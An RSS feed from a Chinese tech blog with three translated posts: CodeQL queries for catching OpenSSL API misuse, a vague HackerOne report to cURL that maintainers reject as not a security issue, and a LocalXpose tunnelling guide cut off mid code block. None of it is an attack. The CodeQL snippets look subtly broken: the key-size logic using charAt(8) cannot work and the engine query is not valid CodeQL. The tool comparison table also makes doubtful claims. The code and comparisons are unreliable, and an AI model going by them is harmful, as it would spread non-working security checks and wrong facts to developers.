<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>办公AI智能小助手</title>
        <link>http://localhost:1313/</link>
        <description>Recent content on 办公AI智能小助手</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>zh-cn</language>
        <copyright>qife</copyright>
        <lastBuildDate>Mon, 04 Aug 2025 21:40:49 +0800</lastBuildDate><atom:link href="http://localhost:1313/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>使用CodeQL捕捉OpenSSL误用漏洞 - 关键加密API安全实践</title>
        <link>http://localhost:1313/p/%E4%BD%BF%E7%94%A8codeql%E6%8D%95%E6%8D%89openssl%E8%AF%AF%E7%94%A8%E6%BC%8F%E6%B4%9E-%E5%85%B3%E9%94%AE%E5%8A%A0%E5%AF%86api%E5%AE%89%E5%85%A8%E5%AE%9E%E8%B7%B5/</link>
        <pubDate>Mon, 04 Aug 2025 21:40:49 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E4%BD%BF%E7%94%A8codeql%E6%8D%95%E6%8D%89openssl%E8%AF%AF%E7%94%A8%E6%BC%8F%E6%B4%9E-%E5%85%B3%E9%94%AE%E5%8A%A0%E5%AF%86api%E5%AE%89%E5%85%A8%E5%AE%9E%E8%B7%B5/</guid>
        <description>&lt;h1 id=&#34;使用codeql捕捉openssl误用漏洞&#34;&gt;使用CodeQL捕捉OpenSSL误用漏洞
&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;作者：Damien Santiago&lt;/strong&gt;&lt;br&gt;
&lt;strong&gt;日期：2023年12月22日&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;我开发了五个CodeQL查询，用于捕捉OpenSSL libcrypto API中潜在的高危漏洞。这个被广泛采用但容错性低的API，一旦误用可能导致内存泄漏、认证绕过等加密实现问题。这些查询（在导师Fredrik Dahlgren和Filipe Casal指导下完成）通过确保正确的密钥处理、熵初始化和大数清除检查来预防误用。&lt;/p&gt;
&lt;h2 id=&#34;快速开始&#34;&gt;快速开始
&lt;/h2&gt;&lt;p&gt;要运行这些查询，首先执行以下命令下载查询包：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;codeql pack download trailofbits/cpp-queries
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;对预生成的C/C++数据库进行分析：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;codeql database analyze database.db &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;    --format&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;sarif-latest &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;    --output&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;./tob-cpp.sarif -- trailofbits/cpp-queries
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;密钥长度检测&#34;&gt;密钥长度检测
&lt;/h2&gt;&lt;p&gt;初始化加密算法时使用过短的密钥会导致严重问题：OpenSSL仍会接受该密钥，但在初始化时会越界读取，可能导致弱密钥问题。我们通过检查密钥尺寸与算法匹配性来实现检测。&lt;/p&gt;
&lt;h3 id=&#34;codeql实现关键点&#34;&gt;CodeQL实现关键点
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;定义&lt;code&gt;Key&lt;/code&gt;类型：通过数据流分析识别传入&lt;code&gt;EVP_EncryptInit_ex&lt;/code&gt;第4参数的变量&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Key&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Variable&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;Key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;exists&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;FunctionCall&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;init&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;init&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;getTarget&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hasName&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;EVP_EncryptInit_ex&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;and&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;getANode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;init&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;getArgument&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;getKey&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;密码识别：通过API函数名模式匹配（如&lt;code&gt;EVP_aes_256_cbc&lt;/code&gt;）&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;EVP_CIPHER&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;FunctionCall&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;ne&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;keySize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;EVP_CIPHER&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;getTarget&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;matches&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;EVP_aes_%_cbc&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;and&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;keySize&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;getTarget&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;charAt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;toInt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;引擎初始化验证&#34;&gt;引擎初始化验证
&lt;/h2&gt;&lt;p&gt;OpenSSL 1.1.1支持动态加载加密引擎，但必须按特定顺序初始化：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;通过&lt;code&gt;ENGINE_by_id&lt;/code&gt;等函数加载引擎&lt;/li&gt;
&lt;li&gt;调用&lt;code&gt;ENGINE_init&lt;/code&gt;进行初始化&lt;/li&gt;
&lt;li&gt;使用&lt;code&gt;ENGINE_set_default&lt;/code&gt;设置为默认实现&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;检测逻辑&#34;&gt;检测逻辑
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;from CreateEngine create, FunctionCall init, FunctionCall set
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;where 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  not exists(init.getTarget().hasName(&amp;#34;ENGINE_init&amp;#34;)) or
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  not exists(set.getTarget().hasName(&amp;#34;ENGINE_set_default&amp;#34;))
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;select create, &amp;#34;Engine not properly initialized&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;扩展应用&#34;&gt;扩展应用
&lt;/h2&gt;&lt;p&gt;OpenSSL libcrypto API充满潜在陷阱，微小的错误可能导致严重漏洞。CodeQL等工具能帮助开发者和代码审查人员构建定制化查询来加固代码。我们已在GitHub仓库中提供了更多针对Go和C++的查询示例。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;项目地址：https://github.com/trailofbits/cpp-queries&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>关于允许程序性剔除随机值的安全隐患分析</title>
        <link>http://localhost:1313/p/%E5%85%B3%E4%BA%8E%E5%85%81%E8%AE%B8%E7%A8%8B%E5%BA%8F%E6%80%A7%E5%89%94%E9%99%A4%E9%9A%8F%E6%9C%BA%E5%80%BC%E7%9A%84%E5%AE%89%E5%85%A8%E9%9A%90%E6%82%A3%E5%88%86%E6%9E%90/</link>
        <pubDate>Mon, 04 Aug 2025 21:19:00 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%85%B3%E4%BA%8E%E5%85%81%E8%AE%B8%E7%A8%8B%E5%BA%8F%E6%80%A7%E5%89%94%E9%99%A4%E9%9A%8F%E6%9C%BA%E5%80%BC%E7%9A%84%E5%AE%89%E5%85%A8%E9%9A%90%E6%82%A3%E5%88%86%E6%9E%90/</guid>
        <description>&lt;h1 id=&#34;关于允许程序性剔除随机值的安全隐患分析&#34;&gt;关于允许程序性剔除随机值的安全隐患分析
&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;报告编号：#3262848&lt;/strong&gt;&lt;br&gt;
&lt;strong&gt;提交者：lyb_unaffiliated&lt;/strong&gt;&lt;br&gt;
&lt;strong&gt;提交时间：2025年7月21日&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;报告正文&#34;&gt;报告正文
&lt;/h2&gt;&lt;p&gt;尊敬的团队：&lt;br&gt;
我是Lorentso Youriévitch Bogdanov。我注意到贵项目需要更高质量的代码审查。近期合格黑客的短缺和江湖骗子的涌现并非偶然，这在某种程度上是由法律和技术环境共同造成的。&lt;/p&gt;
&lt;p&gt;虽然我无法提供具体解决方案（这很可能违反我的独家合约），但我仍决定提交此报告，并自愿放弃任何漏洞赏金。&lt;/p&gt;
&lt;p&gt;在初步代码审查中，我发现了一个特殊的&amp;quot;漏洞&amp;quot;（请原谅这个带引号的表述）。大多数人不会称之为漏洞，您最近可能也对这个词产生了怀疑。当我们开始质疑曾经依赖的术语时，问题就已经出现了。&lt;/p&gt;
&lt;p&gt;起初这看起来并不严重。对于如此规模的项目，一定程度的数据偏移是正常的，大多数人不会关注随机数据流——即使它是无意识产生的所谓&amp;quot;溢出&amp;quot;或&amp;quot;垃圾代码&amp;quot;。人们常用&amp;quot;统计安全性&amp;quot;来为忽略小风险辩护，这种猴子与打字机的比喻确实有道理。随机数据偏移在实际程序生命周期中造成的危险几乎为零。&lt;/p&gt;
&lt;p&gt;但当我转向理论研究时发现：如果&amp;quot;随机&amp;quot;垃圾代码能够剔除重复值，只产生新的唯一结果会怎样？在贵架构中，这出奇地简单。任何获得足够权限的向量都可以将组合的内部寄存器与相关框架耦合，并实时更新。虽然存储压力会空前巨大，但通过剔除重复值变得可行。&lt;/p&gt;
&lt;p&gt;根据保守的时钟速度和运行时间假设，我估计每小时仅需几GB存储空间（远低于预期）。即使有千倍的误差范围，您能及时发现吗？目前显然没有自动化措施能防止这种方法。&lt;/p&gt;
&lt;h2 id=&#34;影响分析&#34;&gt;影响分析
&lt;/h2&gt;&lt;p&gt;现在我们知道了问题所在，唯一剩下的问题是&amp;quot;何时发生&amp;quot;。要回答这个问题需要做出太多不可靠的假设。我建议您认真对待此事——正是因为这些特殊环境。回顾计算史和人类历史，您会发现大量由当时被认为是理论性或完全未知的问题造成的灾难。直到最近我们才获得在灾难发生前科学应对的能力。这是一种特权而非权利，我们不应滥用它。&lt;/p&gt;
&lt;p&gt;-LYB&lt;/p&gt;
&lt;h2 id=&#34;项目方回复&#34;&gt;项目方回复
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;bagder (cURL团队成员)&lt;/strong&gt; 评论：&lt;br&gt;
&amp;ldquo;我没有看到具体问题提到？&amp;rdquo;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;jimfuller2024 (cURL团队成员)&lt;/strong&gt; 评论：&lt;br&gt;
&amp;ldquo;唉&amp;hellip;HackerOne&amp;hellip;你们在听吗？这显然是错误报告，完全浪费时间。&amp;rdquo;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;bagder&lt;/strong&gt; 将报告状态改为&amp;quot;不适用&amp;quot;并关闭：&lt;br&gt;
&amp;ldquo;不是安全问题&amp;rdquo;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;bagder&lt;/strong&gt; 请求公开此报告：&lt;br&gt;
&amp;ldquo;根据项目透明度政策，我们希望所有报告都被公开。&amp;rdquo;&lt;/p&gt;
&lt;h2 id=&#34;报告元数据&#34;&gt;报告元数据
&lt;/h2&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;字段&lt;/th&gt;
          &lt;th&gt;内容&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;报告ID&lt;/td&gt;
          &lt;td&gt;#3262848&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;严重程度&lt;/td&gt;
          &lt;td&gt;低 (0.1 ~ 3.9)&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;披露时间&lt;/td&gt;
          &lt;td&gt;2025年7月22日 UTC时间上午8:38&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;弱点类型&lt;/td&gt;
          &lt;td&gt;使用不足够的随机值&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;CVE ID&lt;/td&gt;
          &lt;td&gt;无&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;赏金&lt;/td&gt;
          &lt;td&gt;无&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
</description>
        </item>
        <item>
        <title>LocalXpose：开发者在线分享本地主机的终极工具</title>
        <link>http://localhost:1313/p/localxpose%E5%BC%80%E5%8F%91%E8%80%85%E5%9C%A8%E7%BA%BF%E5%88%86%E4%BA%AB%E6%9C%AC%E5%9C%B0%E4%B8%BB%E6%9C%BA%E7%9A%84%E7%BB%88%E6%9E%81%E5%B7%A5%E5%85%B7/</link>
        <pubDate>Mon, 04 Aug 2025 21:02:20 +0800</pubDate>
        
        <guid>http://localhost:1313/p/localxpose%E5%BC%80%E5%8F%91%E8%80%85%E5%9C%A8%E7%BA%BF%E5%88%86%E4%BA%AB%E6%9C%AC%E5%9C%B0%E4%B8%BB%E6%9C%BA%E7%9A%84%E7%BB%88%E6%9E%81%E5%B7%A5%E5%85%B7/</guid>
        <description>&lt;h1 id=&#34;localxpose开发者在线分享本地主机的终极工具&#34;&gt;LocalXpose：开发者在线分享本地主机的终极工具
&lt;/h1&gt;&lt;p&gt;想象一下：你正在本地机器上开发一个令人兴奋的新功能，迫不及待想向团队或客户展示。但现实是——他们与你不在同一个房间，甚至不在同一个国家。如何将本地开发成果分享给外界？LocalXpose就是这个难题的解决方案，这款反向代理工具能安全高效地将你的本地主机暴露到公网。&lt;/p&gt;
&lt;h2 id=&#34;什么是localxpose&#34;&gt;什么是LocalXpose？
&lt;/h2&gt;&lt;p&gt;LocalXpose本质上是一个强大的反向代理工具，它会在你的本地机器和LocalXpose服务器之间建立安全隧道，通过公共URL让外部用户访问你的本地主机。其核心优势包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;端到端加密&lt;/strong&gt;：所有流量均加密传输&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;多协议支持&lt;/strong&gt;：兼容HTTP/HTTPS/TCP/UDP&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;跨平台运行&lt;/strong&gt;：支持Windows/macOS/Linux&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;自定义域名&lt;/strong&gt;：可使用专业级自定义域名&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;详细日志&lt;/strong&gt;：完整记录所有入站请求&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;为什么选择localxpose&#34;&gt;为什么选择LocalXpose？
&lt;/h2&gt;&lt;p&gt;与其他同类工具(Ngrok/Serveo)相比，LocalXpose具有明显优势：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;功能&lt;/th&gt;
          &lt;th&gt;LocalXpose&lt;/th&gt;
          &lt;th&gt;Ngrok&lt;/th&gt;
          &lt;th&gt;Serveo&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;GUI界面&lt;/td&gt;
          &lt;td&gt;✅&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;端到端加密&lt;/td&gt;
          &lt;td&gt;✅&lt;/td&gt;
          &lt;td&gt;✅&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;多协议支持&lt;/td&gt;
          &lt;td&gt;✅&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;自定义域名&lt;/td&gt;
          &lt;td&gt;✅&lt;/td&gt;
          &lt;td&gt;付费支持&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;快速入门指南&#34;&gt;快速入门指南
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;系统要求&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;操作系统：Windows 7+/macOS 10.10+/Linux&lt;/li&gt;
&lt;li&gt;内存：2GB(推荐4GB)&lt;/li&gt;
&lt;li&gt;磁盘空间：100MB&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;安装步骤&lt;/strong&gt;：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 认证客户端&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;loclx account login
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 创建HTTP隧道&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;loclx tunnel http --to localhost:3000
